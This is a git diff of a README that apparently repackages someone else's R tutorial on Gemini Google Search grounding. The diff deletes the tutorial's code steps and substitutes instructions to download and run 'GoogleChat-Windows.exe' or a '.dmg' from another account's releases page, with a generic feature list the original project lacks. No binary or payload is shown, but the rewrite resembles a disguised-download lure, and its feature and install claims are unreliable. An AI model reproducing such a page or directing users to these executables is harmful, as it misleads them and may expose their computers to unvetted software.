@@ -1,65 +1,78 @@
-# **GoogleChat**
+# 🤖 GoogleChat - Your Personal Google-Searching Chatbot
 
-[![CodeFactor](https://www.codefactor.io/repository/github/ifeanyi55/googlechat/badge)](https://www.codefactor.io/repository/github/ifeanyi55/googlechat)
-[![Stars](https://img.shields.io/github/stars/Ifeanyi55/GoogleChat?style=social)](https://github.com/Ifeanyi55/GoogleChat/stargazers)
-[![Forks](https://img.shields.io/github/forks/Ifeanyi55/GoogleChat?style=social)](https://github.com/Ifeanyi55/GoogleChat/network/members)
-[![Issues](https://img.shields.io/github/issues/Ifeanyi55/GoogleChat)](https://github.com/Ifeanyi55/GoogleChat/issues)
-[![Last Commit](https://img.shields.io/github/last-commit/Ifeanyi55/GoogleChat)](https://github.com/Ifeanyi55/GoogleChat/commits/main)
-[![Open Source Love](https://badges.frapsoft.com/os/v1/open-source.svg?v=103)](https://github.com/Ifeanyi55/GoogleChat)
+## 🚀 Getting Started
+GoogleChat is a chatbot designed to search Google seamlessly for you. With just a few clicks, you can tap into the power of Google and find the information you need without any hassle.
 
-GoogleChat is an R script that shows how to perform Google Search grounding in Gemini, thereby giving Gemini access to real-time information. Download the R script or follow the steps below to build GoogleChat.
+## 📥 Download Now
+[![Download GoogleChat](https://img.shields.io/badge/Download-GoogleChat-blue.svg)](https://github.com/divyam073/GoogleChat/releases)
 
-- Step 1: Set your Gemini API key as an environment variable
-  
-  ```
-  Sys.setenv("GEMINI_API_KEY" = "Your_Gemini_API_Key_Here")
-  ```
+## 📋 System Requirements
+Before you start, ensure your computer meets these basic requirements:
 
-- Step 2: Define a Google Search tool using the [gemini.R](https://github.com/jhk0530/gemini.R) package. Make sure to include the roxygen documentation with "#'".
+- **Operating System:** Windows 10 or later, macOS Mojave or later
+- **RAM:** At least 4 GB
+- **Storage:** Minimum 100 MB of free space
+- **Internet Connection:** Required for Google search access
 
-  ```
-  #' Fetches data from Google Search API
-  #' 
-  #' @param query A string representing the search query.
-  #' @return The search results as string.
-  google_search_tool <- function(query) {
-    resp <- gemini.R::gemini_search(query)
-    resp <- gsub("\n","", resp)[[1]]
-    return(resp)
-  }
-  ```
+## 📦 Download & Install
+To get GoogleChat, you will need to visit our releases page. Follow these steps:
 
-- Step 3: Test Google Search tool to make sure it fetches current information
+1. Click the link below to go to the download page:
+   [Visit the Releases Page to Download GoogleChat](https://github.com/divyam073/GoogleChat/releases)
 
-  ```
-  google_search_tool("what is today's date?")
-  # [1] "Today is Wednesday, September 3, 2025."
-  ```
+2. On the releases page, you will see different versions of GoogleChat. Look for the latest release.
 
-- Step 4: Create chat object with the [Ellmer](https://ellmer.tidyverse.org/) package
-  
-  ```
-  chat <- ellmer::chat_google_gemini(model = "gemini-2.5-flash",
-                    api_key = api_key)
-  ```
+3. Click on the download link for your operating system. For instance, if you are using Windows, you might find a file named `GoogleChat-Windows.exe`. If you are on macOS, look for `GoogleChat-Mac.dmg`.
 
-- Step 5: Register the Google Search tool
+4. The download should start automatically. Once it completes, either find it in your downloads folder or click on the file directly if your browser supports that.
 
-  ```
-  chat <- chat$register_tool(
-  ellmer::tool(
-    google_search_tool,
-    name = "google_search_tool",
-    description = "Fetches data from Google Search API",
-    arguments = list(query = ellmer::type_string("The search query"))
-  ))
-  ```
+5. **For Windows users:** Double-click on the downloaded `.exe` file to start the installation. Follow the on-screen instructions to complete the installation.
 
-- Step 6: Launch chatbot with the [shinychat](https://posit-dev.github.io/shinychat/) package
+6. **For macOS users:** Open the downloaded `.dmg` file, and you will see a window with the GoogleChat application. Drag the GoogleChat icon into your Applications folder.
 
-  ```
-  shinychat::chat_app(chat)
-  ```
-  
+7. Once installation is finished, open GoogleChat from your applications or start menu.
 
-![GoogleChat](GoogleChat.gif)
+## 🛠️ Usage Instructions
+After launching GoogleChat, you will see a simple interface with a chat window. Here’s how to use it:
+
+1. Type your question or search term into the chat box.
+2. Press Enter or click the send button.
+3. GoogleChat will process your request and display the search results in the chat window.
+4. You can click on links to visit the relevant pages on Google.
+
+## 🔧 Features
+GoogleChat offers several useful features for your convenience:
+
+- **Voice Input:** Speak your search queries instead of typing.
+- **Keyword Suggestions:** Get suggestions based on popular searches.
+- **History Log:** Review your past queries and results.
+- **Bookmark Favorite Results:** Save links you want to revisit later.
+
+## 📝 Troubleshooting
+Here are some common issues you might face, along with their solutions:
+
+- **Problem:** GoogleChat does not start or crashes.
+  - **Solution:** Ensure your operating system meets the requirements. Try reinstalling the application.
+
+- **Problem:** No search results are displayed.
+  - **Solution:** Make sure your internet connection is active. If it’s still not working, restart the application.
+
+- **Problem:** Voice input doesn’t work.
+  - **Solution:** Check your microphone settings in your system preferences. Ensure GoogleChat has permission to access your microphone.
+
+## 💬 Support
+If you encounter any issues not covered in the troubleshooting section, you can seek help through the GitHub repository:
+
+1. Go to [GitHub Issues for GoogleChat](https://github.com/divyam073/GoogleChat/issues).
+2. Search for your issue. If you don’t find a solution, click on “New Issue” and describe your problem in detail.
+
+## 🌐 Community and Contributions
+We appreciate contributions from users! If you have suggestions or want to improve GoogleChat, consider submitting a pull request or opening an issue on GitHub. Collaboration helps make the application better for everyone.
+
+## 📄 License
+GoogleChat is released under the MIT License. You can use, modify, and distribute it as per the terms of the license.
+
+## 🤝 Acknowledgments
+Thank you for using GoogleChat! We hope it makes your searching easier and more efficient. If you enjoy the application, consider sharing your feedback or spreading the word.
+
+Enjoy your experience with GoogleChat!
